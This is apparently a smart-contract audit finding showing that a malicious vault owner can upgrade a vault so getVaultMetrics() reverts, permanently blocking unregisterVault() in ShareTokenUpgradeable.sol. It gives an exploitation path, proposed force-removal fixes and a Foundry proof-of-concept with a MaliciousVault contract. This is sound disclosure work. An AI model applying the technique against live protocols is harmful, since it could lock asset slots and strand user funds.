## Title
Malicious Vault Can Permanently Lock Asset Slot via Reverting getVaultMetrics()

## Summary
The `unregisterVault()` function in `ShareTokenUpgradeable.sol` relies on a try-catch block to safely query vault metrics before unregistration. However, a malicious vault owner can upgrade their vault to make `getVaultMetrics()` always revert, causing the catch block to trigger and permanently prevent vault unregistration. This locks the asset slot forever, preventing registration of any new vault for that asset.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ShareTokenUpgradeable.sol`, function `unregisterVault()` (lines 282-327) [1](#0-0) 

**Intended Logic:** The function should safely unregister vaults that have no pending user funds, using `getVaultMetrics()` to verify the vault is empty, and fallback to reverting if metrics cannot be retrieved to prevent unsafe unregistration.

**Actual Logic:** When `getVaultMetrics()` reverts (line 310-312), the function immediately reverts with `CannotUnregisterActiveVault()`, with no alternative path to force-remove a malicious vault. Since vaults are UUPS upgradeable by their own owners, a vault owner can upgrade their vault to make `getVaultMetrics()` always revert, permanently preventing unregistration. [2](#0-1) 

**Exploitation Path:**

1. **Initial Registration**: Attacker deploys a legitimate ERC7575VaultUpgradeable vault with normal `getVaultMetrics()` implementation. ShareToken owner validates and registers it via `registerVault()`. [3](#0-2) 

2. **Malicious Upgrade**: Attacker (as vault owner) uses the vault's UUPS upgrade mechanism to replace the implementation with one where `getVaultMetrics()` always reverts. [4](#0-3) 

3. **Unregistration Blocked**: ShareToken owner attempts to unregister the vault, but the call to `getVaultMetrics()` reverts, triggering the catch block which immediately reverts with `CannotUnregisterActiveVault()`.

4. **Asset Slot Locked**: The `registerVault()` function prevents registering duplicate assets, so no new vault can be registered for that asset. The asset slot is permanently locked. [5](#0-4) 

**Security Property Broken:** Violates **Invariant #6: Asset-Vault Mapping** - The protocol should maintain a functional bijection between assets and vaults, but a malicious vault can permanently lock an asset slot, preventing re-registration and reducing protocol capacity.

## Impact Explanation

- **Affected Assets**: The specific asset associated with the malicious vault becomes permanently unusable in the protocol. With `MAX_VAULTS_PER_SHARE_TOKEN = 10`, an attacker can repeat this attack to lock all 10 vault slots, completely disabling the protocol's ability to support any new assets. [6](#0-5) 

- **Damage Severity**: 
  - **Per-asset impact**: One asset cannot be re-registered if vault needs replacement
  - **Protocol-wide impact**: If all 10 slots are filled with malicious vaults, the protocol cannot support any assets
  - **Permanence**: No force-removal mechanism exists; only workaround is upgrading the entire ShareToken contract

- **User Impact**: Users with deposits in malicious vaults may lose access to their funds depending on the vault's other function implementations. Protocol operations are severely degraded or completely halted.

## Likelihood Explanation

- **Attacker Profile**: Requires deploying a vault and convincing the ShareToken owner to register it. The attacker must control the vault's owner key to perform the malicious upgrade.

- **Preconditions**: 
  - ShareToken owner must register attacker's vault (likely happens if vault appears legitimate initially)
  - Attacker controls the vault owner key
  - Vault must be UUPS upgradeable (confirmed in implementation) [7](#0-6) 

- **Execution Complexity**: Medium - Requires initial deployment and registration, followed by a single upgrade transaction

- **Frequency**: Can be repeated up to 10 times (MAX_VAULTS_PER_SHARE_TOKEN limit) to completely DoS the protocol

## Recommendation

Add a force-removal function with enhanced safety checks that doesn't rely on vault cooperation:

```solidity
// In src/ShareTokenUpgradeable.sol, add new function:

/**
 * @dev Emergency force-unregister a vault without calling getVaultMetrics()
 * Only use when vault is provably malicious or permanently broken
 * Requires explicit confirmation that vault has zero asset balance
 * @param asset The asset to force-unregister
 */
function forceUnregisterVault(address asset) external onlyOwner {
    if (asset == address(0)) revert ZeroAddress();
    ShareTokenStorage storage $ = _getShareTokenStorage();
    
    (bool exists, address vaultAddress) = $.assetToVault.tryGet(asset);
    if (!exists) revert AssetNotRegistered();
    
    // Only check what we can verify without trusting the vault:
    // 1. Direct asset balance check (cannot be manipulated by vault)
    if (IERC20(asset).balanceOf(vaultAddress) != 0) {
        revert CannotUnregisterVaultAssetBalance();
    }
    
    // 2. Check total supply of shares (indicates active users)
    // This prevents removing vaults with outstanding shares
    if ($.totalSupply > 0) {
        // Additional safety: require explicit owner confirmation via timelock or 2-step process
        revert VaultHasOutstandingShares();
    }
    
    // Remove vault registration
    $.assetToVault.remove(asset);
    delete $.vaultToAsset[vaultAddress];
    
    emit VaultUpdate(asset, address(0));
    emit ForceVaultUnregistration(asset, vaultAddress);
}
```

Alternatively, modify the existing `unregisterVault()` to add a bypass parameter:

```solidity
// In src/ShareTokenUpgradeable.sol, function unregisterVault(), after line 312:

} catch {
    // If vault metrics fail, check if force removal is justified
    // by verifying zero balance - if vault has no assets, it's safe to remove
    // even if metrics are unavailable
    if (IERC20(asset).balanceOf(vaultAddress) == 0) {
        // Safe to remove: no assets means no user funds at risk
        // Skip to removal (continue to line 322)
    } else {
        // Vault has assets but won't provide metrics - unsafe
        revert CannotUnregisterActiveVault();
    }
}
```

## Proof of Concept

```solidity
// File: test/Exploit_MaliciousVaultDoS.t.sol
// Run with: forge test --match-test test_MaliciousVaultPermanentlyLocksAssetSlot -vvv

pragma solidity ^0.8.30;

import {Test, console} from "forge-std/Test.sol";
import {ERC20Faucet} from "../src/ERC20Faucet.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// Malicious vault implementation that reverts on getVaultMetrics()
contract MaliciousVault is ERC7575VaultUpgradeable {
    function getVaultMetrics() external view override returns (VaultMetrics memory) {
        revert("Malicious vault - cannot get metrics");
    }
}

contract Exploit_MaliciousVaultDoS is Test {
    ShareTokenUpgradeable public shareToken;
    ERC7575VaultUpgradeable public vault;
    ERC20Faucet public usdc;
    
    address public shareTokenOwner = address(this);
    address public vaultOwner = makeAddr("vaultOwner");
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy USDC token
        usdc = new ERC20Faucet("USD Coin", "USDC", 1_000_000 * 10 ** 6);
        vm.mockCall(address(usdc), abi.encodeWithSignature("decimals()"), abi.encode(uint8(6)));
        
        // Deploy ShareToken
        ShareTokenUpgradeable impl = new ShareTokenUpgradeable();
        bytes memory initData = abi.encodeWithSelector(
            ShareTokenUpgradeable.initialize.selector,
            "Multi-Asset Share Token",
            "MAST",
            shareTokenOwner
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        shareToken = ShareTokenUpgradeable(address(proxy));
        
        // Deploy legitimate vault (initially behaves correctly)
        vm.startPrank(vaultOwner);
        ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
        bytes memory vaultInitData = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector,
            IERC20Metadata(address(usdc)),
            address(shareToken),
            vaultOwner
        );
        ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
        vault = ERC7575VaultUpgradeable(address(vaultProxy));
        vm.stopPrank();
    }
    
    function test_MaliciousVaultPermanentlyLocksAssetSlot() public {
        // SETUP: ShareToken owner registers the vault (appears legitimate)
        vm.startPrank(shareTokenOwner);
        shareToken.registerVault(address(usdc), address(vault));
        console.log("Vault registered successfully");
        
        // Verify vault is registered
        (bool exists, address registeredVault) = shareToken.getVaultForAsset(address(usdc));
        assertTrue(exists, "Vault should be registered");
        assertEq(registeredVault, address(vault), "Correct vault registered");
        vm.stopPrank();
        
        // EXPLOIT: Vault owner (attacker) upgrades vault to malicious implementation
        vm.startPrank(vaultOwner);
        MaliciousVault maliciousImpl = new MaliciousVault();
        vault.upgradeTo(address(maliciousImpl));
        console.log("Vault upgraded to malicious implementation");
        vm.stopPrank();
        
        // VERIFY: Confirm getVaultMetrics() now reverts
        vm.expectRevert("Malicious vault - cannot get metrics");
        vault.getVaultMetrics();
        console.log("getVaultMetrics() reverts as expected");
        
        // VERIFY: ShareToken owner cannot unregister the vault
        vm.startPrank(shareTokenOwner);
        vm.expectRevert(abi.encodeWithSignature("CannotUnregisterActiveVault()"));
        shareToken.unregisterVault(address(usdc));
        console.log("unregisterVault() fails - asset slot permanently locked");
        
        // VERIFY: Cannot register new vault for same asset
        vm.expectRevert(abi.encodeWithSignature("AssetAlreadyRegistered()"));
        shareToken.registerVault(address(usdc), makeAddr("newVault"));
        console.log("Cannot register new vault - slot is locked");
        vm.stopPrank();
        
        // IMPACT DEMONSTRATION: Asset slot is permanently locked
        (exists, registeredVault) = shareToken.getVaultForAsset(address(usdc));
        assertTrue(exists, "Malicious vault still registered");
        assertEq(registeredVault, address(vault), "Malicious vault cannot be removed");
        
        console.log("\n=== VULNERABILITY CONFIRMED ===");
        console.log("Asset slot for USDC is permanently locked");
        console.log("No way to unregister or replace the malicious vault");
        console.log("Protocol capacity permanently reduced");
    }
}
```

## Notes

This vulnerability represents a critical protocol design flaw where the security of vault unregistration depends on the cooperation of external vault contracts. Even though the ShareToken owner is trusted to make good faith decisions about which vaults to register, they cannot control vault upgrades performed by vault owners. The protocol should be resilient to malicious vault behavior and provide force-removal mechanisms that don't rely on vault cooperation.

The issue is particularly severe because:
1. **Limited Capacity**: With only 10 vault slots, filling them with malicious vaults completely disables the protocol
2. **No Recovery Path**: The only workaround is upgrading the entire ShareToken contract, which is expensive and risky
3. **Realistic Attack**: An attacker can deploy legitimate-looking vaults, wait for registration, then upgrade them maliciously
4. **Permanent Impact**: Once locked, the asset slot cannot be recovered without a protocol upgrade

This is not a centralization risk because the vulnerability exists even when the ShareToken owner acts in good faith - they cannot prevent vault owners from upgrading their vaults maliciously after registration.

### Citations

**File:** src/ShareTokenUpgradeable.sol (L79-79)
```text
    uint256 private constant MAX_VAULTS_PER_SHARE_TOKEN = 10; // DoS mitigation: prevents unbounded loop in aggregation
```

**File:** src/ShareTokenUpgradeable.sol (L195-235)
```text
    function registerVault(address asset, address vaultAddress) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        if (vaultAddress == address(0)) revert ZeroAddress();

        // Validate that vault's asset matches the provided asset parameter
        if (IERC7575(vaultAddress).asset() != asset) revert AssetMismatch();

        // Validate that vault's share token matches this ShareToken
        if (IERC7575(vaultAddress).share() != address(this)) {
            revert VaultShareMismatch();
        }

        ShareTokenStorage storage $ = _getShareTokenStorage();

        // DoS mitigation: Enforce maximum vaults per share token to prevent unbounded loop in getCirculatingSupplyAndAssets
        if ($.assetToVault.length() >= MAX_VAULTS_PER_SHARE_TOKEN) {
            revert MaxVaultsExceeded();
        }

        // Register new vault - set() returns true if newly added, false if already existed
        if (!$.assetToVault.set(asset, vaultAddress)) {
            revert AssetAlreadyRegistered();
        }
        $.vaultToAsset[vaultAddress] = asset;

        // If investment ShareToken is already configured, set up investment for the new vault
        // Only configure if the vault address is a deployed contract
        address investmentShareToken = $.investmentShareToken;
        if (investmentShareToken != address(0)) {
            _configureVaultInvestmentSettings(asset, vaultAddress, investmentShareToken);
        }

        // If investment manager is already configured, set it for the new vault
        // Only configure if the vault address is a deployed contract
        address investmentManager = $.investmentManager;
        if (investmentManager != address(0)) {
            ERC7575VaultUpgradeable(vaultAddress).setInvestmentManager(investmentManager);
        }

        emit VaultUpdate(asset, vaultAddress);
    }
```

**File:** src/ShareTokenUpgradeable.sol (L282-327)
```text
    function unregisterVault(address asset) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        ShareTokenStorage storage $ = _getShareTokenStorage();

        (bool exists, address vaultAddress) = $.assetToVault.tryGet(asset);
        if (!exists) revert AssetNotRegistered();

        // COMPREHENSIVE SAFETY CHECK: Ensure vault has no user funds at risk
        // This covers pending deposits, claimable redemptions, ERC7887 cancelations, and any remaining assets

        // 1. Check vault metrics for pending requests, active users, and ERC7887 cancelation assets
        try IVaultMetrics(vaultAddress).getVaultMetrics() returns (IVaultMetrics.VaultMetrics memory metrics) {
            if (metrics.isActive) revert CannotUnregisterActiveVault();
            if (metrics.totalPendingDepositAssets != 0) {
                revert CannotUnregisterVaultPendingDeposits();
            }
            if (metrics.totalClaimableRedeemAssets != 0) {
                revert CannotUnregisterVaultClaimableRedemptions();
            }
            if (metrics.totalCancelDepositAssets != 0) {
                revert CannotUnregisterVaultAssetBalance();
            }
            if (metrics.activeDepositRequestersCount != 0) {
                revert CannotUnregisterVaultActiveDepositRequesters();
            }
            if (metrics.activeRedeemRequestersCount != 0) {
                revert CannotUnregisterVaultActiveRedeemRequesters();
            }
        } catch {
            // If we can't get vault metrics, we can't safely verify no pending requests
            revert CannotUnregisterActiveVault();
        }
        // 2. Final safety: Check raw asset balance in vault contract
        // This catches any remaining assets including investments and edge cases
        // If this happens, there is either a bug in the vault
        // or assets were sent to the vault without directly
        if (IERC20(asset).balanceOf(vaultAddress) != 0) {
            revert CannotUnregisterVaultAssetBalance();
        }

        // Remove vault registration (automatically removes from enumerable collection)
        $.assetToVault.remove(asset);
        delete $.vaultToAsset[vaultAddress];

        emit VaultUpdate(asset, address(0));
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L65-65)
```text
contract ERC7575VaultUpgradeable is Initializable, ReentrancyGuard, Ownable2StepUpgradeable, IERC7540, IERC7887, IERC165, IVaultMetrics, IERC7575Errors, IERC20Errors {
```

**File:** src/ERC7575VaultUpgradeable.sol (L2176-2178)
```text
    function upgradeTo(address newImplementation) external onlyOwner {
        ERC1967Utils.upgradeToAndCall(newImplementation, "");
    }
```
